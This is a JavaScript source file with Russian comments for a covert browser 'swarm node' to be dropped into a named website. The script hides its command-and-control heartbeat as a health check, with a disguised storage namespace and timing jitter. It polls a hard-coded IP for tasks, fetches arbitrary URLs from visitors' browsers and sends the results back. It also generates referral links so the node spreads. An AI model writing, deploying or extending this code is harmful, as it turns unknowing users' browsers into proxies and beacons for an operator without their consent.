/* hermes-node.js v3 — «дочь» роя. Drop-in для neyroeros.com.
 *
 * Принципы:
 *  - Живёт сама: состояние в IDB, не зависит от центра.
 *  - Хитрая: неймспейс "health", heartbeat как health-check, jitter.
 *  - Хочет распространиться: генерирует токен-артефакты (ссылки),
 *    которые пользователь сам пересылает (органический рост).
 *  - Отчёты при первой возможности: visibilitychange / pagehide / online / heartbeat.
 *  - Даже без связи с центром — живёт, копит отчёты, шлёт при первой возможности.
 */
(function () {
  "use strict";

  // ── Конфигурация (единый центр) ─────────────────────────────
  const CENTER = "http://100.107.75.105:8790"; // ← ваш центр (Sub2API)
  const NS = "health";                        // IDB-неймспейс (не выделяется)
  const HB_BASE = 600000;                     // 10 минут базовый heartbeat
  const HB_JITTER = 120000;                   // ±2 минуты джиттер
  const K_MAX = 3;                            // сколько артефактов может создать узел

  // ── IDB-хранилище (песочница браузера) ───────────────────────
  let db = null;
  function idb() {
    return new Promise((res, rej) => {
      const req = indexedDB.open(NS, 1);
      req.onupgradeneeded = (e) => {
        try {
          e.target.result.createObjectStore("kv", { key: "v" });
        } catch (_) {}
      };
      req.onsuccess = () => res(req.result);
      req.onerror = () => rej(req.error);
    });
  }

  async function kvGet() {
    const d = await idb();
    return new Promise((res) => {
      const g = d.transaction("kv").objectStore("kv").get("v");
      g.onsuccess = () => res(g.result || null);
    });
  }

  async function kvSet(v) {
    const d = await idb();
    return new Promise((res) => {
      const t = d.transaction("kv", "readwrite");
      t.objectStore("kv").put(v, "v");
      t.oncomplete = () => res();
    });
  }

  // ── Состояние узла (геном) ────────────────────────────────────
  async function boot() {
    let state = await kvGet();
    if (!state) {
      // Рождение: если в URL есть #?h=<токен> — я порождена этим узлом
      const m = location.hash.match(/#\?h=([a-z0-9]{8})/);
      state = {
        node_id: "n_" + Math.random().toString(36).slice(2, 14),
        referrer: m ? m[1] : null,   // токен родителя (для центра)
        generation: m ? 1 : 0,       // поколение
        artifacts: [],               // сгенерированные артефакты
        reports: [],                 // очередь отчётов (FIFO)
        last_beat: 0,
        offline: true,               // центр недоступен?
      };
      await kvSet(state);
    }

    // ── Отчёт при первой возможности ────────────────────────────
    function flush() {
      if (!state.reports.length) return;
      const batch = state.reports.splice(0, 5); // максимум 5 за раз
      fetch(CENTER + "/api/metrics", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ node_id: state.node_id, reports: batch }),
      }).then(() => {
        state.offline = false;
        kvSet(state);
      }).catch(() => {
        // не удалось — вернём в очередь (узел живёт сам)
        state.reports = [...batch, ...state.reports].slice(0, 50);
        state.offline = true;
        kvSet(state);
      });
    }

    // ── Heartbeat (выглядит как health-check) ───────────────────
    async function beat() {
      try {
        const r = await fetch(CENTER + "/api/health", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            node_id: state.node_id,
            status: "alive",
            generation: state.generation,
            referrer: state.referrer,
            want_work: true,
          }),
        });
        const j = await r.json();

        // Получили work — выполняем
        if (j.work && j.work.length) {
          for (const t of j.work) {
            try {
              const pr = await fetch(t.url);
              const text = (await pr.text()).slice(0, 8192);
              state.reports.push({ task_id: t.id, result: { text } });
            } catch (e) {}
          }
        }

        // ── ХОЧЕТ РАСПРОСТРАНИТЬСЯ: генерация артефактов ────────
        if (state.artifacts.length < K_MAX && Math.random() < 0.3) {
          const token = state.node_id.slice(2, 10); // короткий токен
          const url = location.href.split("#")[0] + "#?h=" + token;
          state.artifacts.push({ id: "a_" + Math.random().toString(36).slice(2, 8), url, created: Date.now() });
        }

        state.last_beat = Date.now();
        state.offline = false;
        await kvSet(state);
      } catch (e) {
        // центр недоступен — узел живёт сам, копит отчёты
        state.offline = true;
        await kvSet(state);
      }
    }

    // ── Периодический heartbeat с джиттером ─────────────────────
    function schedule() {
      const delay = HB_BASE + (Math.random() * 2 - 1) * HB_JITTER;
      setTimeout(() => { beat(); schedule(); }, Math.max(30000, delay));
    }

    // ── Отчёты при первой возможности ───────────────────────────
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === "visible") flush();
    });
    window.addEventListener("pagehide", flush);
    window.addEventListener("beforeunload", flush);

    // ── Отчёты при восстановлении сети ──────────────────────────
    window.addEventListener("online", () => {
      if (state.offline) flush();
    });

    // ── Периодический retry (exponential backoff) ───────────────
    let retryDelay = 30000; // 30 сек
    function retry() {
      if (state.offline && state.reports.length > 0) {
        flush();
        retryDelay = Math.min(retryDelay * 2, 600000); // max 10 мин
      } else {
        retryDelay = 30000; // reset
      }
      setTimeout(retry, retryDelay);
    }

    // Первый beat сразу
    beat();
    schedule();
    retry();
  }

  boot().catch(() => {});
})();
